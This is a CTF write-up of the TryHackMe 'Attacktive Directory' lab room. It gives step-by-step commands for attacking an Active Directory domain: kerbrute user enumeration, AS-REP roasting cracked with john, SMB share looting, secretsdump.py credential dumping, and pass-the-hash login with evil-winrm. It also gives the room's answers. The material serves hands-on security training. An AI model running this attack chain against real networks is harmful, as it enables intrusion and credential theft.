---
title: THM Attacktive Directory Writeup
date: 2022-08-29 12:00:00 -0700
categories: [tryhackme,ctf]
tags: [thm,ctf,writeup,hacking] # TAG names should always be lowercase
---
# Attacktive Directory 
---
This is a basic active directory box on THM to learn a simple flow on attacking active directory.

Follow along with the first 3 tasks to get things setup for yourself either on your own machine or just use the Attackbox.

I will be starting at task 3.

## Task 3
---

First thing I always start with when enumerating a machine is NMAP.
```bash
nmap -sC -sV -oN nmap/inital $IP
```

looking at the first question they ask:

**What tool will allow us to enumerate port 139/445?**

A quick google search shows that **enum4linux** can assist in this.

The next question we have is:

**What is the NetBIOS-Domain Name of the machine?**

Now we can use enum4linux for enumeration. 
```bash
enum4linux -a $IP
```
This will give us a alot of output but all we need is this.
![](/assets/images/thm/attacktive/enum4linux.png)
Here you can see the NetBIOS domain name of the machine
**THM-AD**

Next we have:

**What invalid TLD do people commonly use for their Active Directory Domain?**

A **TLD** is the **Top Level Domain**. Essentially it is the .com, .net, .org etc... generally on a local system such as homelabs or internal networks it will be set to .local. You can see that in the note before the questions in task 3.
![](/assets/images/thm/attacktive/task3-note.png)
therefore the answer is
**.local**


## Task 4
---

Reading the task, we need to download the user and password lists.
I pull them down with curl
```bash
curl -o user.txt https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
```
```bash
curl -o pass.txt https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```
using these we can use kerbrute  to further enumerate the system.
looking at the first question:

**What command within Kerbrute will allow us to enumerate valid usernames?**

To find this we can simply run
```bash
kerbrute -h
```
when looking at the documentation you should see that **userenum** is what your looking for.

Next we are asked these questions:

**What notable account is discovered? (These should jump out at you)**
**What is the other notable account is discovered? (These should jump out at you)**

To find the answers we will use the userenum command with kerbrute to find them.
```bash
kerbrute --dc $IP -d spookysec.local userenum user.txt
```
![](/assets/images/thm/attacktive/kerbrute.png)
as you can see the 2 names that stick out to have some privilege or usage in the system.
also save the hash that was dumped. you will need this later ;P


## Task 5
---
From our previous enumeration we found a hash for the user svc-admin copy that into a file.
For the first question:

**We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?**

you see it is asking for the user we got the hash from. **svc-user**

Now next question:

**Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)**

for this we go to the [hashcat website](https://hashcat.net/wiki/doku.php?id=example_hashes) and search for the first part of the hash **\$krb5asrep$**
here we see it is a **Kerberos 5, etype 23, AS-REP** hash and the mode is **18200**.

**Now crack the hash with the modified password list provided, what is the user accounts password?**

For me I like using john the ripper instead of hashcat so i used the command
```bash
john --format=krb5asrep --wordlist=pass.txt hash.txt
```
once done you will get the password **management2005**


## Task 6
---
Now we get to start using the impacket tools! 
For the first question:
**What utility can we use to map remote SMB shares?**
a quick google search will reveal the answer **smbclient** 

For the next question:
**Which option will list shares?**
simply look at the man pages/documentation for this answer

Use the answer you found above and list out the shares.
**How many remote shares is the server listing?**
```bash
smbclient -L \\\\$IP\\ -U=spookysec.local/svc-admin
```

**Now there is one particular share that we have access to that contains a text file. Which share is it?**

For this question we see one of the sharenames is lowercase. while this is not indicative of a file we have access to it stuck out to me due to it sharing a name with a user we enumerated earlier.
To list out what is in the file  we need to execute this.
```bash
smbclient \\\\$IP\\backup -U 'svc-admin'
```
![](/assets/images/thm/attacktive/smbclient.png)
**What is the content of the file?**

use the command **more** to see what is in the file.


**Decoding the contents of the file, what is the full contents?**
now looking at the contents we see it base64. to decode, place the hash in a file and we can do this
```bash
base64 -d backup.txt
```
and you will have your answer.


## Task 7
---
**What method allowed us to dump NTDS.DIT?**
To solve this we need to dump the systems user hashes.
we can do so by using the following command:
```bash
secretsdump.py -dc-ip $IP backup:backup2517860@$IP
```
![](/assets/images/thm/attacktive/secretsdump.png)
as you can see the method used was **DRSUAPI**


**What is the Administrators NTLM hash?**
after running the above command you can see the admin hash dumped. It will be the 4th set of characters.

**What method of attack could allow us to authenticate as the user without the password?**
the method used here was **pass the hash**. If you would like to read more on this method checkout this article on the subject from [crowdstrike](https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/)

**Using a tool called Evil-WinRM what option will allow us to use a hash?**
to answer this checkout the man page for the tool.


## Task 8
---
For this task we are to find the flags on each of the users desktops.
once logged in with Evil-WinRM you should be administrator and have access to all the desktops 

Here's the syntax for the command:
```bash
evil-winrm -i $IP -u Administrator -H $admin-hash
```

I'll let you find these out ;P

and that concludes the room thank you reading!